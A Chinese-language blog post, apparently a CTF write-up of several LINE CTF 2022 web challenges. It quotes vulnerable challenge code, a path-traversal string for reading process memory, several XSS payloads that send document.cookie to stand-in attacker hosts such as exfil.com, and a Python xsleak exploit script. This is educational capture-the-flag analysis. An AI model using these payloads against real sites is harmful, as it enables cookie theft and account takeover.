<p>在 Discord 看到有人貼這串，值得參考跟筆記一下：<a target="_blank" rel="noopener" href="https://threadreaderapp.com/thread/1023682809368653826.html">好讀版</a>，推特原串：<a target="_blank" rel="noopener" href="https://twitter.com/DissectMalware/status/1023682809368653826">https://twitter.com/DissectMalware/status/1023682809368653826</a></p>
<h2><span id="online-library19-solves">online library(19 solves)</span></h2><p>這是個可以讀取特定檔案範圍的網頁，重點在這一段：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/:t/:s/:e"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> Express<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> <span class="token literal-property property">res</span><span class="token operator">:</span> Express<span class="token punctuation">.</span>Response<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter"><span class="token keyword">void</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token literal-property property">s</span><span class="token operator">:</span> number <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>s<span class="token punctuation">)</span>
    <span class="token keyword">const</span> <span class="token literal-property property">e</span><span class="token operator">:</span> number <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>e<span class="token punctuation">)</span>
    <span class="token keyword">const</span> <span class="token literal-property property">t</span><span class="token operator">:</span> string <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>t

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\x00-\x1f]|\x7f|\&lt;|\></span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Invalid character in book title."</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>
        Fs<span class="token punctuation">.</span><span class="token function">stat</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">public/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token operator">:</span> NodeJS<span class="token punctuation">.</span>ErrnoException<span class="token punctuation">,</span> <span class="token literal-property property">stats</span><span class="token operator">:</span> Fs<span class="token punctuation">.</span>Stats<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter"><span class="token keyword">void</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"No such a book in bookself."</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!==</span> <span class="token number">NaN</span> <span class="token operator">&amp;&amp;</span> e <span class="token operator">!==</span> <span class="token number">NaN</span> <span class="token operator">&amp;&amp;</span> s <span class="token operator">&lt;</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">-</span> s<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Too large to read."</span><span class="token punctuation">)</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        Fs<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">public/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token operator">:</span> NodeJS<span class="token punctuation">.</span>ErrnoException<span class="token punctuation">,</span> <span class="token literal-property property">fd</span><span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter"><span class="token keyword">void</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>err <span class="token operator">||</span> <span class="token keyword">typeof</span> fd <span class="token operator">!==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Invalid argument."</span><span class="token punctuation">)</span>
                            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">let</span> <span class="token literal-property property">buf</span><span class="token operator">:</span> Buffer <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">alloc</span><span class="token punctuation">(</span>e <span class="token operator">-</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
                                Fs<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>e <span class="token operator">-</span> s<span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token operator">:</span> NodeJS<span class="token punctuation">.</span>ErrnoException<span class="token punctuation">,</span> <span class="token literal-property property">bytesRead</span><span class="token operator">:</span> number<span class="token punctuation">,</span> <span class="token literal-property property">buf</span><span class="token operator">:</span> Buffer<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter"><span class="token keyword">void</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                                    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1>&lt;hr/></span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"There isn't size of book."</span><span class="token punctuation">)</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第 path 的地方放上 <code>/%2e%2e%2f/0/12345</code> 就可以 path traversal 然後任意讀檔一下，但問題是要讀哪裡。</p>
<p>在隊友的幫忙下讀了 <code>/proc/self/mem</code>，就是現在 node process 的記憶體，至於讀哪段要從 <code>/proc/self/maps</code> 去找，怎麼找我就不知道了。</p>
<p>然後因為有個 endpoint 會把參數放到 memory 中，所以可以先用那個 endpoint 去放你的 payload，接著因為這題讀檔有給 offset 的關係，找到記憶體中的 payload 把 offset 設定好，丟給 bot 以後就 XSS 了。</p>
<p>不過根據賽後討論，似乎是因為 flag 在 cookie 中，而 bot 送 request 到 server 時會帶 flag，所以這段 flag 也會出現在記憶體中，因此直接讀記憶體也可以找到 flag，不用 XSS。</p>
<h2><span id="haribote-secure-note7-solves">Haribote Secure Note(7 solves)</span></h2><p>這題卡了一整天，到最後依舊沒解開，so sad QQ</p>
<p>這題可以設定一個暱稱，最多 16 個字，然後可以新增 note，有 title 跟 content，顯示筆記的頁面關鍵程式碼在這裡：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; csp_nonce &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">const</span> <span class="token function-variable function">printInfo</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> sharedUserId <span class="token operator">=</span> <span class="token string">"&#123;&#123; shared_user_id &#125;&#125;"</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> sharedUserName <span class="token operator">=</span> <span class="token string">"&#123;&#123; shared_user_name &#125;&#125;"</span><span class="token punctuation">;</span>
        <span class="token comment">// 省略</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">const</span> printInfoBtn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'printInfoBtn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printInfoBtn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> printInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>還有接近結尾的這段：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; csp_nonce &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">const</span> <span class="token function-variable function">render</span> <span class="token operator">=</span> <span class="token parameter">notes</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 省略</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> notes <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前面那邊給了我們 16 個字的 JS injection，最後面 notes 那裡則是可以用 <code>&lt;/script&gt;</code> 來跳離標籤，是 HTML injection，而這題的難點在於 CSP 很嚴：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-&#123;&#123; csp_nonce &#125;&#125;'
    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default<span class="token punctuation">"</span></span>
          <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>因為有 nonce，所以 <code>unsafe-inline</code> 沒作用，而 <code>unsafe-eval</code> 沒開所以也沒辦法動態去執行程式碼。</p>
<p>當初卡很久之後我有一個想法是我們可以用 HTML injection 插入一個表單 <code>&lt;form id=&quot;f&quot;&gt;</code>，然後就可以對 admin CSRF，目的是去改 admin 的暱稱，因為在另一個頁面 profile 是沒有 CSP 的，而且同樣可以注入：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>display_name<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-control form-control-sm<span class="token punctuation">"</span></span>
 <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inputUserDisplayName<span class="token punctuation">"</span></span>
 <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; current_user.display_name &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>nickname 的部分可以設定成：<code>&quot;;f.submit();&quot;</code> 之類的，就可以送出表單。改完之後再去造訪 profile 頁面，在那個頁面執行 XSS。</p>
<p>但最大的問題是 <code>&quot;onfocus=eval(name) </code> 有 20 個字元，超過了界線所以無法成功（而且還要想一下 name 要怎麼設定）。</p>
<p>賽後看了其他人的解答，主要有三種。</p>
<p>第一種來自 <a target="_blank" rel="noopener" href="https://gist.github.com/mdsnins/d8028c47212342ecadd9af5ec10f53f9">Super HexaGoN</a>，是利用一個神奇的 <a target="_blank" rel="noopener" href="https://www.w3.org/TR/2011/WD-html5-20110405/tokenization.html#script-data-double-escaped-state">script data double escaped state</a>，把兩個注入點中間的東西都註解掉，就可以在有 nonce 的 script 裡面執行程式碼。之前從沒看過這個，以後再來研究一下。</p>
<pre class="line-numbers language-none"><code class="language-none">display name: &lt;!--&lt;script&gt;&quot;&#125;&#x2F;*
title: --&gt; &#x2F;*
content: *&#x2F; location.href&#x3D;&#39;(attacker)&#x2F;c&#x3D;&#39;+document.cookie<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>





<p>第二種是利用 <a target="_blank" rel="noopener" href="https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/#script-loading-like-import">import 不會被 Trusted Types 檔的特性</a>，底下 payload 來自 <a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#haribote-secure-note">maple3142</a>：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">display name<span class="token operator">:</span>
<span class="token string">"+import(y)+"</span>

<span class="token literal-property property">title</span><span class="token operator">:</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>a id<span class="token operator">=</span>x href<span class="token operator">=</span><span class="token string">"//SERVER"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>

<span class="token literal-property property">content</span><span class="token operator">:</span>
<span class="token operator">&lt;</span>a id<span class="token operator">=</span>y href<span class="token operator">=</span><span class="token string">"data:text/javascript,open(x+`?`+document.cookie);alert()"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第三種則是利用 iframe，在其他頁面執行程式碼（來自 eskildsen#8025）：</p>
<pre class="line-numbers language-none"><code class="language-none">name:
&quot;;f.eval(p+&quot;&quot;);&quot;

title:
&lt;&#x2F;script&gt;&lt;iframe src&#x3D;&quot;&#x2F;p&quot; name&#x3D;f&gt;&lt;&#x2F;iframe&gt; 

content:
&lt;a href&#x3D;&quot;javascript:window.top.location&#x3D;&#39;http:&#x2F;&#x2F;exfil.com&#x2F;&#39;+btoa(this.parent.document.cookie)&quot; id&#x3D;p name&#x3D;p&gt;payload&lt;&#x2F;a&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第三種是我唯一覺得自己有可能想到的，因為其他兩個我都不知道。</p>
<p>話說 <code>&quot;;f.eval(p+&quot;&quot;);&quot;</code> 跟 <code>&lt;!--&lt;script&gt;&quot;&#125;/*</code> 恰巧都是 16 個字，我猜其中一個應該是非預期解，這就是 CTF 好玩的地方XD</p>
<p>然後這題真的很有趣而且很值得學習，三種解法都是完全不同的思路。</p>
<p>喔對了，然後 maple3142 的 writeup 解決了我一個疑惑，那就是為什麼這一題的 template 都不會 escape，原來是因為 flask 預設只會 escape HTML&#x2F;XML&#x2F;XHTML，難怪我沒看到什麼設定。</p>
<h2><span id="title-todo6-solves">title todo(6 solves)</span></h2><p>這題基本上就是個上傳圖片的網站，上傳完會拿到一個 url，接著可以給 title 跟 image url 新建一個 post。</p>
<p>flag 則是用 admin 身份造訪時會放在網頁的最 footer，而且有著奇怪的格式：<code>LINECTF&#123;([0-9a-f]/)&#123;10&#125;&#125;</code></p>
<p>然後在顯示圖片的網頁有個地方沒有用雙引號包住：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>&#123;&#123;</span> <span class="token attr-name">image.url</span> <span class="token attr-name">&#125;&#125;</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mb-3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>雖然看起來是很小的一點，但其實整題的解法都是從這邊延伸出去的。從這邊不難看出我們可以控制 img 的任何屬性，不過我在這邊卡了頗久，想說可以控制又怎樣，沒辦法跳離 img 就不能 XSS。</p>
<p>然後經過隊友提醒才想到 <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/">STTF</a> 的 xsleak，透過 img 的 lazy loading 來偵測是否有 scroll 的行為，所以只要 title 用很長，把 img 推下去，再加上 <code>loading=lazy</code> 的屬性，就可以搭配 STTF 來 leak 一個 byte。</p>
<p>不過這題還有一點要注意，就是 CSP：</p>
<pre class="line-numbers language-none"><code class="language-none">default-src &#39;self&#39;; script-src &#39;self&#39;; style-src &#39;self&#39;; img-src &#39;self&#39; blob:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>CSP 繞不開，所以就算 <code>src</code> 可控，也沒辦法設置外面的圖片。因此這題加上了另一個機制：cache，可以根據 response header 來決定一個圖片的 cache 是 miss 還是 hit，所以我們只要上傳一張新的圖片丟給 bot，過幾秒再去看他的 response header，如果是 hit 就代表 bot 有訪問圖片，代表 SSTF 有成功。</p>
<p>照著這個概念寫一個 exploit 就好：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> time
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

base_url <span class="token operator">=</span> <span class="token string">'http://35.187.204.223'</span>
cookie <span class="token operator">=</span> <span class="token string">"session=.eJwtzrERwzAIAMBdVKcAJCHkZXyA4JzWjqtcdk-K_AT_LnuecR1le513PMr-XGUrqLggVU2SQCFTKqiIUxpbIhpNThy0GkEdXWaGdJ-16nJ3GAO8iwP0QeY5ISjnzLoImHE5VwmdzVCIaxOMMNGIPrizhlErv8h9xfnfAJTPF00fL_M.Yj71GQ.S1yffSzbOk6Rny1VyCqPTL-5wM8"</span>

<span class="token keyword">def</span> <span class="token function">upload_image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'img_file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'a.png'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>

  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">'/image/upload'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> cookie
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_post</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">'/image'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"w"</span><span class="token operator">*</span><span class="token number">5000</span><span class="token punctuation">,</span>
    <span class="token string">"img_url"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"/static/image/111 srcset=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string"> loading=lazy "</span></span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> cookie
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"X-ImageId"</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">share</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> keyword<span class="token punctuation">)</span><span class="token punctuation">:</span>
  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">'/share'</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"path"</span><span class="token punctuation">:</span> <span class="token string">"image/"</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">"#:~:text="</span> <span class="token operator">+</span> keyword<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> cookie
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> resp<span class="token punctuation">.</span>text

<span class="token keyword">def</span> <span class="token function">check_cached</span><span class="token punctuation">(</span>img_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> img_url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> cookie
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"X-Cache-Status"</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  known <span class="token operator">=</span> <span class="token string">"LINECTF&#123;"</span>
  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token string">"0123456789abcdef"</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"trying:"</span> <span class="token operator">+</span> known<span class="token operator">+</span>char<span class="token punctuation">)</span>

      resp <span class="token operator">=</span> upload_image<span class="token punctuation">(</span><span class="token punctuation">)</span>
      img_url <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token string">"img_url"</span><span class="token punctuation">]</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"img url:"</span> <span class="token operator">+</span> img_url<span class="token punctuation">)</span>

      img_id <span class="token operator">=</span> create_post<span class="token punctuation">(</span>img_url<span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"img id:"</span> <span class="token operator">+</span> img_id<span class="token punctuation">)</span>

      share_res <span class="token operator">=</span> share<span class="token punctuation">(</span>img_id<span class="token punctuation">,</span> known <span class="token operator">+</span> char<span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"resp:"</span> <span class="token operator">+</span> share_res<span class="token punctuation">)</span>

      sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
      cache_resp <span class="token operator">=</span> check_cached<span class="token punctuation">(</span>img_url<span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"cached:"</span> <span class="token operator">+</span> cache_resp<span class="token punctuation">)</span>
      <span class="token keyword">if</span> cache_resp <span class="token operator">==</span> <span class="token string">"HIT"</span><span class="token punctuation">:</span>
        known <span class="token operator">+=</span> char <span class="token operator">+</span> <span class="token string">"/"</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>known<span class="token punctuation">)</span>
        <span class="token keyword">break</span>


run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>另外，maple3142 的 writeup 又解決了我一個疑惑，那就是為什麼 flag 要有那些 <code>/</code>？原來是因為 Chromium 為了避免這種 xsleak，所以在判斷 SSTF 的時候一定要匹配到整個單字才會 scroll。</p>
<p>舉例來說，如果頁面上有這串字：<code>Hello world</code>，你 text fragment 指定 <code>He</code>，是不會理你的，要 <code>Hello</code> 才會，這也是為什麼這題要用 <code>/</code> 來分割，因為沒分割的話就沒辦法一個字一個字來 leak。</p>
<h2><span id="me7-ball2-solves">me7-ball(2 solves)</span></h2><p>這題看起來好像跟 crypto 比較有關就沒仔細看了，直接貼 Super HexaGoN 的 writeup：<a target="_blank" rel="noopener" href="https://gist.github.com/mdsnins/2912b9656c837e5190364136b307c682">https://gist.github.com/mdsnins/2912b9656c837e5190364136b307c682</a></p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/03/30/wordpress-plugin-amelia-sensitive-information-disclosure/">WordPress Plugin Amelia &lt; 1.0.49 敏感資訊洩露漏洞細節</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/03/14/javascript-number/">使用 JavaScript 的數字時的常見錯誤</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">評論</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
